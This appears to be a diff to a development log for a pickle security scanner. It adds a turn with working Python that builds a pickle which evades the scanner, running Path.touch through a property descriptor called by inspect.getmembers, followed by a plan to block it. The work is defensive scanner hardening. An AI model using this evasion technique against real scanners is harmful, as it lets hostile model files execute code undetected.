@@ -3510,3 +3510,115 @@ Blocking plan:
 
 Performance note: one tuple in the sorted static table, no logging-state or
 filter-list modeling.
+
+## Turn 75 - `inspect.getmembers` descriptor invocation gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib introspection to
+invoke an attacker-controlled descriptor getter during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_inspect_getmembers_property_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        s("x"),
+        sg("builtins", "property"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R",
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R\x940",
+        sg("inspect", "getmembers"),
+        b"h\x01\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=186`, `bytes_total=186`, `opcode_count=38`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `builtins.property`, `pathlib.Path.touch`, and `inspect.getmembers`, all
+  with `is_dangerous=False`
+- Control proof: the same pickle without the final `inspect.getmembers` call
+  returns a `DerivedPath` instance and does not create
+  `/tmp/ma_inspect_getmembers_property_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_inspect_getmembers_property_marker`; the returned member list
+  contains `("x", None)` because `Path.touch(marker)` is the property value
+- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
+  subclass with descriptor `x = property(pathlib.Path.touch)`. Calling
+  `inspect.getmembers(instance)` walks names from `dir(instance)` and resolves
+  each with `getattr(instance, name)`. Resolving `x` invokes the property
+  getter as `Path.touch(instance)`, creating the marker before
+  `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `inspect` is not a wildcard-dangerous module, and `inspect.getmembers` is
+  absent from `DANGEROUS_GLOBALS`.
+- `builtins.type` and `builtins.property` are clean. The policy blocks direct
+  `builtins.property.__get__` references, but this payload never imports that
+  method explicitly.
+- The payload uses only currently clean globals: `builtins.type`,
+  `pathlib.PosixPath`, `builtins.property`, `pathlib.Path.touch`, and
+  `inspect.getmembers`.
+- The dangerous callable is hidden as a descriptor getter and is invoked by
+  introspection, so the final visible call target is a clean inspection helper.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, or magic-method names.
+
+Performance note: this is a precise introspection sink. The focused next block
+should add a sorted `DANGEROUS_GLOBALS` entry for `("inspect", "getmembers")`,
+with an oracle regression proving that class and descriptor construction alone
+does not create the marker but introspective member collection does. Blocking
+`inspect.getmembers_static` is not required for this proof because that helper
+avoids dynamic descriptor lookup.
+
+## Turn 76 - Block `inspect.getmembers` descriptor walks
+
+Blocking plan:
+
+- Add `("inspect", "getmembers")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. The helper resolves discovered names with dynamic `getattr()` and can
+  invoke attacker-controlled descriptors.
+- Leave `builtins.type`, `builtins.property`, and `pathlib.PosixPath` allowed
+  for this focused block. They synthesize the object graph, but the side effect
+  in the proof occurs when `inspect.getmembers()` walks descriptors.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"x": property(Path.touch)})` payload, verifies class/instance
+  construction remains clean and does not create the marker, then verifies
+  scan-time detection on the RCE variant before proving introspection creates
+  the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one tuple in the sorted static table, no descriptor graph or
+introspection-flow modeling.
